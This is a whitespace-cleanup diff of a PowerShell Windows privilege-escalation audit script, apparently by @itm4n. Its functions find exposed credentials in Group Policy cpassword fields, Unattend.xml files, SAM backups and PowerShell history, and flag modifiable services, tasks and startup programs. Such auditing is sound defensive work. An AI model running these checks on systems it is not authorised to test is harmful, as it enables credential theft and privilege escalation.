                         $Type = "Data Source"
-                        $UserName = $Properties.username 
-                        $Cpassword = $Properties.cpassword 
+                        $UserName = $Properties.username
+                        $Cpassword = $Properties.cpassword
                         $Content = "DSN: $($Properties.dsn)"
                     }
-    
+
                     Drives {
                         $Type = "Mapped Drive"
-                        $UserName = $Properties.userName 
-                        $Cpassword = $Properties.cpassword 
+                        $UserName = $Properties.userName
+                        $Cpassword = $Properties.cpassword
                         $Content = "Path: $($Properties.path)"
                     }
-    
+
                     Services {
                         $Type = "Service"
-                        $UserName = $Properties.accountName 
-                        $Cpassword = $Properties.cpassword 
+                        $UserName = $Properties.accountName
+                        $Cpassword = $Properties.cpassword
                         $Content = "Name: $($Properties.serviceName)"
                     }
 
                     Printers {
                         $Type = "Printer"
-                        $UserName = $Properties.username 
-                        $Cpassword = $Properties.cpassword 
+                        $UserName = $Properties.username
+                        $Cpassword = $Properties.cpassword
                         $Content = "Path: $($Properties.path)"
                     }
                 }
@@ -5190,13 +5190,13 @@ function Invoke-PowerShellHistoryCheck {
     .SYNOPSIS
 
     Searches for interesting keywords in the PowerShell history of the current user.
-    
+
     .DESCRIPTION
 
-    PowerShell commands are saved in a file (ConsoleHost_history.txt), in a subdirectory of the 
-    current user's AppData folder. This script extracts the content of this file and also checks 
+    PowerShell commands are saved in a file (ConsoleHost_history.txt), in a subdirectory of the
+    current user's AppData folder. This script extracts the content of this file and also checks
     whether it contains some keywords such as "password".
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-PowerShellHistoryCheck
@@ -5206,7 +5206,7 @@ function Invoke-PowerShellHistoryCheck {
     LastWriteTime : 04/10/2020 22:40:30
     Lines         : 634
     Matches       : 12
-    
+
     #>
 
     $HistoryFilePath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
@@ -5229,11 +5229,11 @@ function Invoke-PowerShellHistoryCheck {
     }
 }
 # ----------------------------------------------------------------
-# END CREDENTIALS     
+# END CREDENTIALS
 # ----------------------------------------------------------------
 
 # ----------------------------------------------------------------
-# BEGIN SENSITIVE FILES 
+# BEGIN SENSITIVE FILES
 # ----------------------------------------------------------------
 function Invoke-SamBackupFilesCheck {
     <#
@@ -5244,19 +5244,19 @@ function Invoke-SamBackupFilesCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     The SAM/SYSTEM registry hives are stored as files in a known location:
     'C:\windows\System32\config'. These files are locked by default so even SYSTEM can't read them
     when the system is running. However, copies of these files can be created in other folders so
-    it's worth checking if these files are accessible. 
-    
+    it's worth checking if these files are accessible.
+
     #>
-    
+
     [CmdletBinding()] param()
 
-    $ArrayOfPaths = New-Object System.Collections.ArrayList 
+    $ArrayOfPaths = New-Object System.Collections.ArrayList
     [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "repair\SAM"))
     [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\RegBack\SAM"))
     [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\SAM"))
@@ -5266,15 +5266,15 @@ function Invoke-SamBackupFilesCheck {
 
     ForEach ($Path in [string[]]$ArrayOfPaths) {
 
-        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) { 
+        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) {
 
-            Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError | Out-Null 
+            Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError | Out-Null
 
             if (-not $GetContentError) {
-                $SamBackupFile = New-Object -TypeName PSObject 
-                $SamBackupFile | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Path 
+                $SamBackupFile = New-Object -TypeName PSObject
+                $SamBackupFile | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Path
                 $SamBackupFile
-            } 
+            }
         }
     }
 }
@@ -5283,17 +5283,17 @@ function Invoke-UnattendFilesCheck {
     <#
     .SYNOPSIS
 
-    Enumerates Unattend files and extracts credentials 
+    Enumerates Unattend files and extracts credentials
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Searches common locations for "Unattend.xml" files. When a file is found, it calls the custom 
+    Searches common locations for "Unattend.xml" files. When a file is found, it calls the custom
     "Get-UnattendSensitiveData" function to extract credentials from it. Note: credentials are only
     returned if the password is not empty and not equal to "*SENSITIVE*DATA*DELETED*".
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-UnattendFilesCheck | fl
@@ -5308,7 +5308,7 @@ function Invoke-UnattendFilesCheck {
 
     [CmdletBinding()] param()
 
-    $ArrayOfPaths = New-Object System.Collections.ArrayList 
+    $ArrayOfPaths = New-Object System.Collections.ArrayList
     [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattended.xml"))
     [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend.xml"))
     [void]$ArrayOfPaths.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend\Unattended.xml"))
@@ -5318,25 +5318,25 @@ function Invoke-UnattendFilesCheck {
 
     ForEach ($Path in [string[]]$ArrayOfPaths) {
 
-        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) { 
+        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) {
 
             Write-Verbose "Found file: $Path"
 
-            $Result = Get-UnattendSensitiveData -Path $Path 
+            $Result = Get-UnattendSensitiveData -Path $Path
             if ($Result) {
-                $Result | Add-Member -MemberType "NoteProperty" -Name "File" -Value $Path 
+                $Result | Add-Member -MemberType "NoteProperty" -Name "File" -Value $Path
                 $Result
             }
         }
     }
 }
 # ----------------------------------------------------------------
-# END SENSITIVE FILES 
+# END SENSITIVE FILES
 # ----------------------------------------------------------------
 
 
 # ----------------------------------------------------------------
-# BEGIN INSTALLED PROGRAMS   
+# BEGIN INSTALLED PROGRAMS
 # ----------------------------------------------------------------
 function Invoke-InstalledProgramsCheck {
     <#
@@ -5346,13 +5346,13 @@ function Invoke-InstalledProgramsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Uses the custom "Get-InstalledPrograms" function to get a filtered list of installed programs
-    and then returns each result as a simplified PS object, indicating the name and the path of 
+    and then returns each result as a simplified PS object, indicating the name and the path of
     the application.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-InstalledProgramsCheck | ft
@@ -5361,24 +5361,24 @@ function Invoke-InstalledProgramsCheck {
     ----            --------
     Npcap           C:\Program Files\Npcap
     Wireshark       C:\Program Files\Wireshark
-    
+
     #>
-    
+
     [CmdletBinding()] param()
 
-    $InstalledProgramsResult = New-Object System.Collections.ArrayList 
+    $InstalledProgramsResult = New-Object System.Collections.ArrayList
 
     $Items = Get-InstalledPrograms -Filtered
 
     ForEach ($Item in $Items) {
-        $CurrentFileName = $Item.Name 
+        $CurrentFileName = $Item.Name
         $CurrentFileFullname = $Item.FullName
-        $AppItem = New-Object -TypeName PSObject 
+        $AppItem = New-Object -TypeName PSObject
         $AppItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $CurrentFileName
         $AppItem | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $CurrentFileFullname
         [void]$InstalledProgramsResult.Add($AppItem)
     }
-    
+
     $InstalledProgramsResult
 }
 
@@ -5390,12 +5390,12 @@ function Invoke-ModifiableProgramsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    For each non-default application, enumerates the .exe and .dll files that the current user has 
+    For each non-default application, enumerates the .exe and .dll files that the current user has
     modify permissions on.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-ModifiableProgramsCheck | ft
@@ -5405,21 +5405,21 @@ function Invoke-ModifiableProgramsCheck {
     C:\Program Files\VulnApp\Packages   DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
     C:\Program Files\VulnApp\app.exe    DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
     C:\Program Files\VulnApp\foobar.dll DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
-    
+
     #>
-    
+
     [CmdletBinding()] param()
 
     $Items = Get-InstalledPrograms -Filtered
 
     ForEach ($Item in $Items) {
-        
+
         $SearchPath = New-Object -TypeName System.Collections.ArrayList
         [void]$SearchPath.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*")) # Do this to avoid the use of -Depth which is PSH5+
         [void]$SearchPath.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*\*")) # Do this to avoid the use of -Depth which is PSH5+
-        
-        $ChildItems = Get-ChildItem -Path $SearchPath -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
-        
+
+        $ChildItems = Get-ChildItem -Path $SearchPath -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError
+
         if (-not $GetChildItemError) {
 
             $ChildItems | ForEach-Object {
@@ -5428,9 +5428,9 @@ function Invoke-ModifiableProgramsCheck {
                     $ModifiablePaths = $_ | Get-ModifiablePath -LiteralPaths
                 } else {
                     # Check only .exe and .dll ???
-                    # TODO: maybe consider other extensions 
+                    # TODO: maybe consider other extensions
                     if ($_.FullName -Like "*.exe" -or $_.FullName -Like "*.dll") {
-                        $ModifiablePaths = $_ | Get-ModifiablePath -LiteralPaths 
+                        $ModifiablePaths = $_ | Get-ModifiablePath -LiteralPaths
                     }
                 }
 
@@ -5449,18 +5449,18 @@ function Invoke-ModifiableProgramsCheck {
 function Invoke-ProgramDataCheck {
     <#
     .SYNOPSIS
-    
+
     Checks for modifiable files and folders under non default ProgramData folders.
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     This script first lists all the subfolders under 'C:\ProgramData\'. For each folder that
-    is not a "known" default Windows folder, it lists all the files and folders it contains. If a 
+    is not a "known" default Windows folder, it lists all the files and folders it contains. If a
     modifiable file or folder is found, it is reported by the script.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-ProgramDataCheck
@@ -5484,7 +5484,7 @@ function Invoke-ProgramDataCheck {
     ModifiablePath    : C:\ProgramData\VMware\logs
     IdentityReference : BUILTIN\Users
     Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
-    
+
     #>
 
     [CmdletBinding()] param()
@@ -5492,12 +5492,12 @@ function Invoke-ProgramDataCheck {
     $IgnoredProgramData = @("Microsoft", "Microsoft OneDrive", "Package Cache", "Packages", "SoftwareDistribution", "ssh", "USOPrivate", "USOShared", "")
 
     Get-ChildItem -Path $env:ProgramData | ForEach-Object {
-    
+
         if ($_ -is [System.IO.DirectoryInfo] -and (-not ($IgnoredProgramData -contains $_.Name))) {
-    
+
             $_ | Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-                        
-                $_ | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} 
+
+                $_ | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
             }
         }
     }
@@ -5511,14 +5511,14 @@ function Invoke-ApplicationsOnStartupCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
-    
+
     Applications can be run on startup or whenever a user logs on. They can be either configured
-    in the registry or by adding an shortcut file (.LNK) in a Start Menu folder. 
-    
+    in the registry or by adding an shortcut file (.LNK) in a Start Menu folder.
+
     .EXAMPLE
-    
+
     PS C:\> Invoke-ApplicationsOnStartupCheck
 
     Name         : SecurityHealth
@@ -5530,7 +5530,7 @@ function Invoke-ApplicationsOnStartupCheck {
     Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VMware User Process
     Data         : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
     IsModifiable : False
-    
+
     #>
 
     [CmdletBinding()] param()
@@ -5555,31 +5555,31 @@ function Invoke-ApplicationsOnStartupCheck {
 
                     $ModifiablePaths = $RegKeyValueData | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
                     if (([object[]]$ModifiablePaths).Length -gt 0) {
-                        $IsModifiable = $True 
+                        $IsModifiable = $True
                     } else {
-                        $IsModifiable = $False 
+                        $IsModifiable = $False
                     }
-    
-                    $ResultItem = New-Object -TypeName PSObject 
+
+                    $ResultItem = New-Object -TypeName PSObject
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegKeyValueName
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Path" -Value "$($RegKeyPath)\$($RegKeyValueName)"
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Data" -Value $RegKeyValueData
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $IsModifiable
-                    $ResultItem 
+                    $ResultItem
                 }
             }
         }
     }
 
     $Root = (Get-Item -Path $env:windir).PSDrive.Root
-    
+
     # We want to check only startup applications that affect all users
     # [string[]]$FileSystemPaths = "\Users\All Users\Start Menu\Programs\Startup", "\Users\$env:USERNAME\Start Menu\Programs\Startup"
     [string[]]$FileSystemPaths = "\Users\All Users\Start Menu\Programs\Startup"
 
     $FileSystemPaths | ForEach-Object {
 
-        $StartupFolderPath = Join-Path -Path $Root -ChildPath $_ 
+        $StartupFolderPath = Join-Path -Path $Root -ChildPath $_
 
         Get-ChildItem -Path $StartupFolderPath -ErrorAction SilentlyContinue | ForEach-Object {
             $EntryName = $_.Name
@@ -5599,12 +5599,12 @@ function Invoke-ApplicationsOnStartupCheck {
                         $IsModifiable = $False
                     }
 
-                    $ResultItem = New-Object -TypeName PSObject 
+                    $ResultItem = New-Object -TypeName PSObject
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $EntryName
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $EntryPath
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Data" -Value "$($Shortcut.TargetPath) $($Shortcut.Arguments)"
                     $ResultItem | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $IsModifiable
-                    $ResultItem 
+                    $ResultItem
 
                 } catch {
                     # do nothing
@@ -5622,14 +5622,14 @@ function Invoke-ApplicationsOnStartupVulnCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Some applications can be set as "startup" applications for all users. If a user can modify one
-    of these apps, they would potentially be able to run arbitrary code in the context of other 
+    of these apps, they would potentially be able to run arbitrary code in the context of other
     users. Therefore, low-privileged users should not be able to modify the files used by such
     application.
-    
+
     #>
 
     Invoke-ApplicationsOnStartupCheck | Where-Object { $_.IsModifiable }
@@ -5638,19 +5638,19 @@ function Invoke-ApplicationsOnStartupVulnCheck {
 function Invoke-ScheduledTasksImagePermissionsCheck {
     <#
     .SYNOPSIS
-    
+
     Enumrates scheduled tasks with a modifiable path
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     This function enumerates all the scheduled tasks which are visible by the current user but are
-    not owned by the current user. For each task, it extracts the command line and checks whether 
-    it contains a path pointing to a modifiable file. If a task is run as the current user, it is 
-    filtered out. 
-    
+    not owned by the current user. For each task, it extracts the command line and checks whether
+    it contains a path pointing to a modifiable file. If a task is run as the current user, it is
+    filtered out.
+
     .EXAMPLE
 
     PS C:\> Invoke-ScheduledTasksImagePermissionsCheck
@@ -5664,7 +5664,7 @@ function Invoke-ScheduledTasksImagePermissionsCheck {
     ModifiablePath     : C:\APPS\
     IdentityReference  : NT AUTHORITY\Authenticated Users
     Permissions        : {Delete, WriteAttributes, Synchronize, ReadControl...}
-    
+
     #>
 
     [CmdletBinding()] param()
@@ -5691,11 +5691,11 @@ function Invoke-ScheduledTasksUnquotedPathCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     This script first enumerates all the tasks that are visible to the current user. Then, it checks the 'Command' value to see if it is not surrounded by quotes (unquoted path). If so, it checks whether the path contains spaces and if one of the intermediate directories is exploitable. Note that, as a low privileged user, not all the tasks are visible.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-ScheduledTasksUnquotedPathCheck
@@ -5709,7 +5709,7 @@ function Invoke-ScheduledTasksUnquotedPathCheck {
     ModifiablePath     : C:\APPS
     IdentityReference  : NT AUTHORITY\Authenticated Users
     Permissions        : {Delete, WriteAttributes, Synchronize, ReadControl...}
-    
+
     #>
 
     [CmdletBinding()] param()
@@ -5736,18 +5736,18 @@ function Invoke-RunningProcessCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    First, it lists all the processes thanks to the built-in "Get-Process" function. Then, it 
+    First, it lists all the processes thanks to the built-in "Get-Process" function. Then, it
     filters the result in order to return only the non-default Windows processes. By default,
-    this function returns only process that are NOT owned by teh current user but you can 
-    use the "-Self" flag to get them. 
-    
+    this function returns only process that are NOT owned by teh current user but you can
+    use the "-Self" flag to get them.
+
     .PARAMETER Self
 
     Use this flag to get a list of all the process owned by the current user
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-RunningProcessCheck | ft
@@ -5778,15 +5778,15 @@ function Invoke-RunningProcessCheck {
     WmiPrvSE              3972 N/A               0
 
     #>
-    
+
     [CmdletBinding()] param(
         [switch]
         $Self = $False
     )
 
-    $CurrentUser = $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name 
+    $CurrentUser = $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
-    $IgnoredProcessNames = @("Idle", "services", "Memory Compression", "TrustedInstaller", "PresentationFontCache", "Registry", "ServiceShell", "System", 
+    $IgnoredProcessNames = @("Idle", "services", "Memory Compression", "TrustedInstaller", "PresentationFontCache", "Registry", "ServiceShell", "System",
     "csrss", # Client/Server Runtime Subsystem
     "dwm", # Desktop Window Manager
     "msdtc", # Microsoft Distributed Transaction Coordinator
@@ -5794,7 +5794,7 @@ function Invoke-RunningProcessCheck {
     "svchost" # Service Host
     )
 
-    $AllProcess = Get-Process 
+    $AllProcess = Get-Process
 
     ForEach ($Process in $AllProcess) {
 
@@ -5806,32 +5806,32 @@ function Invoke-RunningProcessCheck {
 
             if ($Self) {
                 if ($ProcessUser -eq $CurrentUser) {
-                    $ReturnProcess = $True 
+                    $ReturnProcess = $True
                 }
             } else {
                 if (-not ($ProcessUser -eq $CurrentUser)) {
 
                     # Here, I check whether 'C:\Windows\System32\<PROC_NAME>.exe' exists
                     # Not ideal but it's a quick way to check whether it's a built-in binary.
-                    # There might be some issues because of the FileSystem Redirector if the script is 
+                    # There might be some issues because of the FileSystem Redirector if the script is
                     # run from a 32-bits instance of powershell.exe (-> SysWow64 instead of System32).
                     $PotentialImagePath = Join-Path -Path $env:SystemRoot -ChildPath "System32"
                     $PotentialImagePath = Join-Path -Path $PotentialImagePath -ChildPath "$($Process.name).exe"
 
-                    # If we can't find it in System32, add it to the list 
+                    # If we can't find it in System32, add it to the list
                     if (-not (Test-Path -Path $PotentialImagePath)) {
-                        $ReturnProcess = $True 
+                        $ReturnProcess = $True
                     }
-                    $ReturnProcess = $True 
+                    $ReturnProcess = $True
                 }
             }
 
             if ($ReturnProcess) {
-                $RunningProcess = New-Object -TypeName PSObject 
-                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Process.Name 
-                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $Process.Id 
+                $RunningProcess = New-Object -TypeName PSObject
+                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Process.Name
+                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $Process.Id
                 $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "User" -Value $(if ($ProcessUser) { $ProcessUser } else { "N/A" })
-                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Process.Path 
+                $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Process.Path
                 $RunningProcess | Add-Member -MemberType "NoteProperty" -Name "SessionId" -Value $Process.SessionId
                 $RunningProcess
             }
@@ -5842,11 +5842,11 @@ function Invoke-RunningProcessCheck {
     }
 }
 # ----------------------------------------------------------------
-# END INSTALLED PROGRAMS   
+# END INSTALLED PROGRAMS
 # ----------------------------------------------------------------
 
 # ----------------------------------------------------------------
-# BEGIN SERVICES   
+# BEGIN SERVICES
 # ----------------------------------------------------------------
 function Test-ServiceDaclPermission {
     <#
@@ -5947,7 +5947,7 @@ function Test-ServiceDaclPermission {
             'GenericRead'           = [uint32]'0x80000000'
             'AllAccess'             = [uint32]'0x000F01FF'
         }
-        
+
         $CheckAllPermissionsInSet = $False
 
         if($PSBoundParameters['Permissions']) {
@@ -5974,20 +5974,20 @@ function Test-ServiceDaclPermission {
             $TargetService = $IndividualService | Add-ServiceDacl
 
             # We might not be able to access the Service at all so we must check whether Add-ServiceDacl returned something.
-            if ($TargetService -and $TargetService.Dacl) { 
+            if ($TargetService -and $TargetService.Dacl) {
 
                 # Enumerate all group SIDs the current user is a part of
                 $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                 $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                 $CurrentUserSids += $UserIdentity.User.Value
 
-                # Check all the Dacl objects of the current service 
+                # Check all the Dacl objects of the current service
                 ForEach($ServiceDacl in $TargetService.Dacl) {
 
                     $MatchingDaclFound = $False
 
-                    # A Dacl object contains two properties we want to check: a SID and a list of AccessRights 
-                    # First, we want to check if the current Dacl SID is in the list of SIDs of the current user 
+                    # A Dacl object contains two properties we want to check: a SID and a list of AccessRights
+                    # First, we want to check if the current Dacl SID is in the list of SIDs of the current user
                     if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {
 
                         if($CheckAllPermissionsInSet) {
@@ -6004,7 +6004,7 @@ function Test-ServiceDaclPermission {
                             }
                             if($AllMatched) {
                                 $TargetService
-                                $MatchingDaclFound = $True 
+                                $MatchingDaclFound = $True
                             }
                         } else {
 
@@ -6013,7 +6013,7 @@ function Test-ServiceDaclPermission {
                                 if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                     Write-Verbose "Current user has '$TargetPermission' permission for $IndividualService"
                                     $TargetService
-                                    $MatchingDaclFound = $True 
+                                    $MatchingDaclFound = $True
                                     break
                                 }
                             }
@@ -6021,7 +6021,7 @@ function Test-ServiceDaclPermission {
                     }
 
                     if ($MatchingDaclFound) {
-                        # As soon as we find a matching Dacl, we can stop searching 
+                        # As soon as we find a matching Dacl, we can stop searching
                         break
                     }
                 }
@@ -6040,13 +6040,13 @@ function Invoke-InstalledServicesCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    It uses the custom "Get-ServiceList" function to get a filtered list of services that are 
-    configured on the local machine. Then it returns each result in a custom PS object, 
+    It uses the custom "Get-ServiceList" function to get a filtered list of services that are
+    configured on the local machine. Then it returns each result in a custom PS object,
     indicating the name, display name, binary path, user and start mode of the service.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-InstalledServicesCheck | ft
@@ -6056,18 +6056,18 @@ function Invoke-InstalledServicesCheck {
     VMTools VMware Tools "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" LocalSystem Automatic
 
     #>
-    
+
     [CmdletBinding()] param()
 
     $InstalledServicesResult = New-Object -TypeName System.Collections.ArrayList
 
-    # Get only third-party services 
+    # Get only third-party services
     $FilteredServices = Get-ServiceList -FilterLevel 3
     Write-Verbose "Enumerating $($FilteredServices.Count) services..."
 
     ForEach ($Service in $FilteredServices) {
         # Make a simplified version of the Service object, we only basic information for ths check.
-        $ServiceItem = New-Object -TypeName PSObject 
+        $ServiceItem = New-Object -TypeName PSObject
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $Service.DisplayName
         $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
@@ -6088,17 +6088,17 @@ function Invoke-ServicesPermissionsRegistryCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     The configuration of the services is maintained in the registry. Being able to modify these
     registry keys means being able to change the settings of a service. In addition, a complete
     machine reboot isn't necessary for these settings to be taken into account. Only the affected
-    service needs to be restarted. 
-    
+    service needs to be restarted.
+
     .EXAMPLE
 
-    PS C:\> Invoke-ServicesPermissionsRegistryCheck 
+    PS C:\> Invoke-ServicesPermissionsRegistryCheck
 
     Name              : VulnService
     ImagePath         : C:\APPS\MyApp\service.exe
@@ -6111,11 +6111,11 @@ function Invoke-ServicesPermissionsRegistryCheck {
     UserCanRestart    : False
 
     #>
-    
+
     [CmdletBinding()] param()
-    
-    # Get all services except the ones with an empty ImagePath or Drivers 
-    $AllServices = Get-ServiceList -FilterLevel 2 
+
+    # Get all services except the ones with an empty ImagePath or Drivers
+    $AllServices = Get-ServiceList -FilterLevel 2
     Write-Verbose "Enumerating $($AllServices.Count) services..."
 
     ForEach ($Service in $AllServices) {
@@ -6126,12 +6126,12 @@ function Invoke-ServicesPermissionsRegistryCheck {
             # Can we restart the service?
             $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
             if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
-    
+
             # Can we start the service?
             $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
             if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }
 
-            $ServiceItem = New-Object -TypeName PSObject 
+            $ServiceItem = New-Object -TypeName PSObject
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
@@ -6150,20 +6150,20 @@ function Invoke-ServicesUnquotedPathCheck {
     <#
     .SYNOPSIS
 
-    Enumerates all the services with an unquoted path. For each one of them, enumerates paths that 
-    the current user can modify. Based on the original "Get-ServiceUnquoted" function from 
-    PowerUp. 
+    Enumerates all the services with an unquoted path. For each one of them, enumerates paths that
+    the current user can modify. Based on the original "Get-ServiceUnquoted" function from
+    PowerUp.
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     In my version of this function, I tried to eliminate as much false positives as possible.
-    PowerUp tends to report "C:\" as exploitable whenever a program located in "C:\Program 
+    PowerUp tends to report "C:\" as exploitable whenever a program located in "C:\Program
     Files" is identified. The problem is that we cannot write "C:\program.exe" so the service
     wouldn't be exploitable. We can only create folders in "C:\" by default.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-ServicesUnquotedPathCheck
@@ -6177,15 +6177,15 @@ function Invoke-ServicesUnquotedPathCheck {
     Status            : Unknown
     UserCanStart      : False
     UserCanRestart    : False
-    
+
     #>
-    
+
     [CmdletBinding()] param()
 
     # Get all services which have a non-empty ImagePath (exclude drivers as well)
     $Services = Get-ServiceList -FilterLevel 2
     Write-Verbose "Enumerating $($Services.Count) services..."
-    
+
     # $PermissionsAddFile = @("WriteData/AddFile", "DeleteChild", "WriteDAC", "WriteOwner")
     # $PermissionsAddFolder = @("AppendData/AddSubdirectory", "DeleteChild", "WriteDAC", "WriteOwner")
 
@@ -6199,12 +6199,12 @@ function Invoke-ServicesUnquotedPathCheck {
             # Can we restart the service?
             $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
             if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
-    
+
             # Can we start the service?
             $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
             if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }
 
-            $ServiceItem = New-Object -TypeName PSObject 
+            $ServiceItem = New-Object -TypeName PSObject
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
@@ -6227,13 +6227,13 @@ function Invoke-ServicesImagePermissionsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     FIrst, it enumerates the services thanks to the custom "Get-ServiceList" function. For each
     result, it checks the permissions of the ImagePath setting thanks to the "Get-ModifiablePath"
-    function. Each result is returned in a custom PS object. 
-    
+    function. Each result is returned in a custom PS object.
+
     .EXAMPLE
 
     PS C:\> Invoke-ServicesImagePermissionsCheck
@@ -6247,28 +6247,28 @@ function Invoke-ServicesImagePermissionsCheck {
     Status            : Unknown
     UserCanStart      : False
     UserCanRestart    : False
-    
+
     #>
-    
+
     [CmdletBinding()] param()
-    
+
     $Services = Get-ServiceList -FilterLevel 1
     Write-Verbose "Enumerating $($Services.Count) services..."
 
     ForEach ($Service in $Services) {
 
         $Service.ImagePath | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
-            
+
             $Status = "Unknown"
             # Can we restart the service?
             $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
